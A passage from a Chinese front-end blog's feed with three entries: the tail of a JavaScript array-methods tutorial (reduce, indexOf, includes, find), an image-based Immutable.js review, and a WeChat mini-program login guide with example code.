class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">arr.reduce(<span class="function"><span class="keyword">function</span> (<span class="params">accumulator,currentValue,currentIndex,arr</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(currentIndex)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> accumulator + currentValue;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1,2,3,4,5 没传入initialValue，索引是从1开始</span></span><br><span class="line"></span><br><span class="line">arr.reduce(<span class="function"><span class="keyword">function</span> (<span class="params">accumulator,currentValue,currentIndex,arr</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(currentIndex)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> accumulator + currentValue;</span><br><span class="line">&#125;,<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0,1,2,3,4,5 传入initialValue，索引从0开始</span></span><br><span class="line"><span class="comment">// 应用到二维数组展开</span></span><br><span class="line"><span class="keyword">let</span> arr = [[<span class="number">0</span>, <span class="number">1</span>], [<span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>]].reduce(</span><br><span class="line">    (a, b) =&gt; a.concat(b)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(arr)</span><br><span class="line"><span class="comment">// [0, 1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><h4 id="4-7-indexof"><a href="#4-7-indexof" class="headerlink" title="4.7  indexof()"></a>4.7  indexof()</h4><blockquote><p>方法返回在数组中可以找到一个给定元素的第一个索引，如果不存在，则返回-1</p></blockquote><ul><li>注意： <code>indexOf</code> 使用严格相等（即 <code>===</code>）比较 <code>searchElement</code> 和数组中的元素。而且<code>indexOf()</code>不能识别 <code>NaN</code></li><li>返回值： 首个被找到的元素在数组中的索引位置; 若没有找到则返回 -1</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>];</span><br><span class="line">array.indexOf(<span class="number">2</span>) <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">array.indexOf(<span class="number">7</span>) <span class="comment">// -1</span></span><br><span class="line">array.indexOf(<span class="number">9</span>, <span class="number">2</span>) <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">array.indexOf(<span class="number">9</span>, <span class="number">3</span>) <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line">array.indexOf(<span class="number">2</span>, <span class="number">-1</span>) <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line">array.indexOf(<span class="number">2</span>, <span class="number">-3</span>) <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">array.indexOf(<span class="number">2</span>, <span class="number">-4</span>) <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> array1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="literal">NaN</span>];</span><br><span class="line"></span><br><span class="line">array1.indexOf(<span class="literal">NaN</span>) <span class="comment">// -1</span></span><br></pre></td></tr></table></figure><h4 id="4-8-includes"><a href="#4-8-includes" class="headerlink" title="4.8 includes()"></a>4.8 includes()</h4><blockquote><p>方法用来判断一个数组是否包含一个指定的值，根据情况，如果包含则返回 true，否则返回false。 ES7新增</p></blockquote><ul><li>返回值： 一个布尔值，根据情况，如果包含则返回 true，否则返回false</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>); <span class="comment">// true</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">4</span>); <span class="comment">// false</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">3</span>, <span class="number">3</span>); <span class="comment">// false</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">3</span>, <span class="number">-1</span>); <span class="comment">// true</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">3</span>, <span class="number">-4</span>); <span class="comment">// true</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="literal">NaN</span>].includes(<span class="literal">NaN</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h4 id="4-9-find-和-findIndex"><a href="#4-9-find-和-findIndex" class="headerlink" title="4.9 find() 和 findIndex()"></a>4.9 find() 和 findIndex()</h4><blockquote><p>find 方法返回数组中满足提供的测试函数的第一个元素的值。否则返回 undefined。findIndex 方法返回数组中满足提供的测试函数的第一个元素的索引。否则返回-1</p></blockquote><ul><li><code>find</code> 方法，当某个元素通过 callback 的测试时，返回数组中的一个值，否则返回 undefined。</li><li><code>findIndex</code>方法，返回数组中满足提供的测试函数的第一个元素的索引。否则返回-1</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// find</span></span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">-5</span>, <span class="number">10</span>].find(<span class="function">(<span class="params">n</span>) =&gt;</span> n &lt; <span class="number">0</span>); <span class="comment">// 返回元素-5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">-5</span>, <span class="number">10</span>,<span class="literal">NaN</span>].find(<span class="function">(<span class="params">n</span>) =&gt;</span> <span class="built_in">Object</span>.is(<span class="literal">NaN</span>, n)); <span class="comment">// 返回元素NaN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// findIndex</span></span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">-5</span>, <span class="number">10</span>].findIndex(<span class="function">(<span class="params">n</span>) =&gt;</span> n &lt; <span class="number">0</span>); <span class="comment">// 返回索引2</span></span><br><span class="line"><span class="keyword">let</span> b = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">-5</span>, <span class="number">10</span>,<span class="literal">NaN</span>].findIndex(<span class="function">(<span class="params">n</span>) =&gt;</span> <span class="built_in">isNaN</span>(n)); <span class="comment">// 返回索引4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 稀疏数组</span></span><br><span class="line"><span class="keyword">let</span> a =[<span class="number">1</span>,,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> index = <span class="number">0</span>;</span><br><span class="line">a.find(<span class="function">(<span class="params">n</span>) =&gt;</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">console</span>.log(index++) <span class="comment">//0,1,2 第二次是empty也会调用一次，而且返回为true，立即退出</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> n === <span class="number">3</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="4-10-其他"><a href="#4-10-其他" class="headerlink" title="4.10 其他"></a>4.10 其他</h4><ul><li><code>keys()</code>方法返回一个新的Array迭代器，它包含数组中每个索引的键</li><li><code>values()</code> 方法返回一个新的Array迭代器，它包含数组中每个索引的值</li><li><code>entries()</code>方法返回一个新的Array迭代器，该对象包含数组中每个索引的键/值对</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、数组预览图&quot;&gt;&lt;a href=&quot;#一、数组预览图&quot; class=&quot;headerlink&quot; title=&quot;一、数组预览图&quot;&gt;&lt;/a&gt;一、数组预览图&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="JavaScript" scheme="http://blog.poetries.top/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>Immutable之回顾</title>
    <link href="http://blog.poetries.top/2018/08/13/immutable-review/"/>
    <id>http://blog.poetries.top/2018/08/13/immutable-review/</id>
    <published>2018-08-13T12:00:24.000Z</published>
    <updated>2018-08-23T01:41:37.483Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、Immutable几种数据结构"><a href="#一、Immutable几种数据结构" class="headerlink" title="一、Immutable几种数据结构"></a>一、Immutable几种数据结构</h2><p><img src="https://upload-images.jianshu.io/upload_images/1480597-3275d98aea9c495c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Immutable几种数据结构"></p><h2 id="二、fromJS"><a href="#二、fromJS" class="headerlink" title="二、fromJS"></a>二、fromJS</h2><p><img src="https://upload-images.jianshu.io/upload_images/1480597-7e32935b6f0a992d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="fromJS"></p><h2 id="三、toJS"><a href="#三、toJS" class="headerlink" title="三、toJS"></a>三、toJS</h2><p><img src="https://upload-images.jianshu.io/upload_images/1480597-2dcb4403cb5dedda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="toJS"></p><h2 id="四、Is"><a href="#四、Is" class="headerlink" title="四、Is"></a>四、Is</h2><p><img src="https://upload-images.jianshu.io/upload_images/1480597-d9bfcdafb2a6f811.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Is"></p><h2 id="五、数据读取"><a href="#五、数据读取" class="headerlink" title="五、数据读取"></a>五、数据读取</h2><p><img src="https://upload-images.jianshu.io/upload_images/1480597-d2ddb1f7ebbeb23f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="数据读取"></p><h2 id="六、数据修改"><a href="#六、数据修改" class="headerlink" title="六、数据修改"></a>六、数据修改</h2><p><img src="https://upload-images.jianshu.io/upload_images/1480597-c2a867804ae9d504.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="数据修改"></p><h2 id="七、List中的各种删除与插入"><a href="#七、List中的各种删除与插入" class="headerlink" title="七、List中的各种删除与插入"></a>七、List中的各种删除与插入</h2><p><img src="https://upload-images.jianshu.io/upload_images/1480597-706d3f73f1dce76a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="List中的各种删除与插入"></p><h2 id="八、关于merge"><a href="#八、关于merge" class="headerlink" title="八、关于merge"></a>八、关于merge</h2><p><img src="https://upload-images.jianshu.io/upload_images/1480597-77524b0bdcca757e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="关于merge"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、Immutable几种数据结构&quot;&gt;&lt;a href=&quot;#一、Immutable几种数据结构&quot; class=&quot;headerlink&quot; title=&quot;一、Immutable几种数据结构&quot;&gt;&lt;/a&gt;一、Immutable几种数据结构&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="Immutable" scheme="http://blog.poetries.top/tags/Immutable/"/>
    
  </entry>
  
  <entry>
    <title>小程序之登录</title>
    <link href="http://blog.poetries.top/2018/08/12/wx-login/"/>
    <id>http://blog.poetries.top/2018/08/12/wx-login/</id>
    <published>2018-08-12T16:01:20.000Z</published>
    <updated>2018-08-23T01:41:37.491Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、登录流程"><a href="#一、登录流程" class="headerlink" title="一、登录流程"></a>一、登录流程</h2><p><img src="http://upload-images.jianshu.io/upload_images/1781505-f4bda834cc1d7210.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><ul><li>小程序内通过<code>wx.login</code>接口获得<code>code</code></li><li>将<code>code</code>传入后台，后台对微信服务器发起一个<code>https</code>请求换取<code>openid</code>、<code>session_key</code>(解密<code>encryptedData</code>、<code>iv</code>得到的)</li><li>后台生成一个自身的<code>3rd_session</code>（以此为<code>key</code>值保持<code>openid</code>和<code>session_key</code>），返回给前端。PS:微信方的<code>openid</code>和<code>session_key</code>并没有发回给前端小程序 </li><li>小程序拿到<code>3rd_session</code>之后保持在本地</li><li>小程序请求登录区内接口，通过<code>wx.checkSession</code>检查登录态，如果失效重新走上述登录流程，否则待上<code>3rd_session</code>到后台进行登录验证</li></ul><blockquote><p>通过上面<code>wx.login</code>和<code>wx.getUserInfo</code>两个api拿到相应的信息,并通过上方接口传给自己的服务器. </p></blockquote><p><strong>登录获取用户信息</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wx.login(&#123;</span><br><span class="line">    success(res)&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(res)</span><br><span class="line">       <span class="comment">//code:"fda41033Z0fdak3dfae01dffaaWXQA1vwQ4dfae0Akg3e0Z0k3E"</span></span><br><span class="line">       <span class="comment">//errMsg:"login:ok"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wx.getUserInfo(&#123;</span><br><span class="line">   success(res)&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(res)</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure><p>返回的信息</p><p><img src="https://upload-images.jianshu.io/upload_images/1480597-2f4df6ebf02b9e33.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="userInfo"></p><p><strong>需要传输的信息有7个参数</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">appid  小程序唯一标识</span><br><span class="line">secret  小程序的 app secret</span><br><span class="line">js_code  <span class="comment">//wx.login登录时获取的 code,用于后续获取session_key</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//下面两个参数用户服务器端签名校验用户信息的</span></span><br><span class="line">signature 使用 sha1( rawData + sessionkey ) 得到字符串，用于校验用户信息。</span><br><span class="line">rawData  不包括敏感信息的原始数据字符串，用于计算签名。</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面两个参数是用于解密获取openId和UnionId的</span></span><br><span class="line">encryptedData  包括敏感数据在内的完整用户信息的加密数据</span><br><span class="line">iv 加密算法的初始向量</span><br></pre></td></tr></table></figure><ul><li>可精简为以下三个参数. </li><li>其余的签名校验的参数可省略,而<code>appid</code>和<code>secret</code>可以直接写在服务器.</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">js_code <span class="comment">//  wx.login登录时获取的 code,用于后续获取session_key</span></span><br><span class="line">encryptedData  包括敏感数据在内的完整用户信息的加密数据</span><br><span class="line">iv 加密算法的初始向量</span><br></pre></td></tr></table></figure><blockquote><p>服务端处理返回token、sessionId过程省略…</p></blockquote><h2 id="二、登录态校验"><a href="#二、登录态校验" class="headerlink" title="二、登录态校验"></a>二、登录态校验</h2><blockquote><p>主要用到<code>checkSession</code></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">wx.checkSession(&#123;</span><br><span class="line">    success: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'warning wx.checkSession OK, but no viewerId'</span>, res);</span><br><span class="line">    &#125;,</span><br><span class="line">    fail: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'wx.checkSession failed:'</span>, res);</span><br><span class="line">    &#125;,</span><br><span class="line">    complete: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        wx.login(&#123;</span><br><span class="line">            success: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'wx.login success:'</span>, res);</span><br><span class="line">                <span class="comment">// 登录自有系统</span></span><br><span class="line">                API.login.wechat(&#123;</span><br><span class="line">                    js_code: res.code</span><br><span class="line">                &#125;, d =&gt; &#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">'private login response:'</span>, d);</span><br><span class="line">                    <span class="keyword">if</span> (d.code === <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(<span class="string">'private login success:'</span>, d);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">let</span> viewerId = d.data.user.user_id;</span><br><span class="line">                        _m.globalData.viewerId = viewerId;</span><br><span class="line"></span><br><span class="line">                        wx.setStorageSync(<span class="string">'user_id'</span>, viewerId);</span><br><span class="line"></span><br><span class="line">                        callback &amp;&amp; callback();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="built_in">console</span>.error(<span class="string">'get user_id error'</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;, &#123;</span><br><span class="line">                    ignoreError: <span class="literal">true</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;,</span><br><span class="line">            fail: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'wx.login failed:'</span>, res);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="三、完整登录代码示例"><a href="#三、完整登录代码示例" class="headerlink" title="三、完整登录代码示例"></a>三、完整登录代码示例</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> CONFIG = <span class="built_in">require</span>(<span class="string">'./config.js'</span>)</span><br><span class="line">App(&#123;</span><br><span class="line">    globalData:&#123;</span><br><span class="line">        viewerId:<span class="literal">null</span>,</span><br><span class="line">        userInfo:<span class="literal">null</span></span><br><span class="line">    &#125;,</span><br><span class="line">    onLaunch()&#123;</span><br><span class="line">        <span class="comment">// 注册当前用户</span></span><br><span class="line">        <span class="keyword">this</span>.register()</span><br><span class="line">    &#125;,</span><br><span class="line">    login: <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> _m = <span class="keyword">this</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 开发环境重复使用就好</span></span><br><span class="line">        <span class="keyword">if</span> (!viewerId &amp;&amp; CONFIG.IS_DEBUG) &#123;</span><br><span class="line">            viewerId = wx.getStorageSync(<span class="string">'user_id'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 先检查是否有登录态，且获取过用户数据；否则触发一次登录</span></span><br><span class="line">        <span class="keyword">if</span> (viewerId) &#123;</span><br><span class="line">            _m.globalData.viewerId = viewerId;</span><br><span class="line">            callback &amp;&amp; callback();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            wx.checkSession(&#123;</span><br><span class="line">                success: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">'warning wx.checkSession OK, but no viewerId'</span>, res);</span><br><span class="line">                &#125;,</span><br><span class="line">                fail: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">'wx.checkSession failed:'</span>, res);</span><br><span class="line">                &#125;,</span><br><span class="line">                complete: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                    wx.login(&#123;</span><br><span class="line">                        success: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">                            <span class="built_in">console</span>.log(<span class="string">'wx.login success:'</span>, res);</span><br><span class="line">                            <span class="comment">// 登录自有系统</span></span><br><span class="line">                            API.login.wechat(&#123;</span><br><span class="line">                                js_code: res.code</span><br><span class="line">                            &#125;, d =&gt; &#123;</span><br><span class="line">                                <span class="built_in">console</span>.log(<span class="string">'private login response:'</span>, d);</span><br><span class="line">                                <span class="keyword">if</span> (d.code === <span class="number">0</span>) &#123;</span><br><span class="line">                                    <span class="built_in">console</span>.log(<span class="string">'private login success:'</span>, d);</span><br><span class="line">    </span><br><span class="line">                                    <span class="keyword">let</span> viewerId = d.data.user.user_id;</span><br><span class="line">                                    _m.globalData.viewerId = viewerId;</span><br><span class="line">    </span><br><span class="line">                                    wx.setStorageSync(<span class="string">'user_id'</span>, viewerId);</span><br><span class="line">    </span><br><span class="line">                                    callback &amp;&amp; callback();</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="built_in">console</span>.error(<span class="string">'get user_id error'</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;, &#123;</span><br><span class="line">                                ignoreError: <span class="literal">true</span></span><br><span class="line">                            &#125;);</span><br><span class="line">                        &#125;,</span><br><span class="line">                        fail: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">                            <span class="built_in">console</span>.log(<span class="string">'wx.login failed:'</span>, res);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    register: <span class="function"><span class="keyword">function</span>(<span class="params">needTry, callback</span>)</span>&#123;</span><br><span class="line">        !callback &amp;&amp; (callback = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">this</span>.login(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="comment">// 如果曾经授权过，则不用再请求了</span></span><br><span class="line">            <span class="comment">/*try &#123;</span></span><br><span class="line"><span class="comment">                let registedTime = wx.getStorageSync('REGISTED.'+ this.globalData.viewerId);</span></span><br><span class="line"><span class="comment">                // 7天内授权过的不再请求，不再更新资料</span></span><br><span class="line"><span class="comment">                if (registedTime &amp;&amp; ((new Date).getTime()-registedTime) &lt; 604800000) &#123;</span></span><br><span class="line"><span class="comment">                    callback();</span></span><br><span class="line"><span class="comment">                    return;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">            &#125; catch (e) &#123;&#125;*/</span></span><br><span class="line">        </span><br><span class="line">            wx.getUserInfo(&#123;</span><br><span class="line">                success: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">let</span> params = &#123;&#125;;</span><br><span class="line">        </span><br><span class="line">                    <span class="keyword">this</span>.globalData.userInfo = res.userInfo;</span><br><span class="line">                    params.owner = &#123;</span><br><span class="line">                        id: <span class="keyword">this</span>.globalData.viewerId,</span><br><span class="line">        </span><br><span class="line">                        connected_profile: &#123;</span><br><span class="line">                            nickname : res.userInfo.nickName||<span class="string">''</span>,  <span class="comment">// 用户昵称</span></span><br><span class="line">                            profile_pic_url: res.userInfo.avatarUrl||<span class="string">''</span>,  <span class="comment">// 头像， avatarUrl</span></span><br><span class="line">                            language : res.userInfo.language||<span 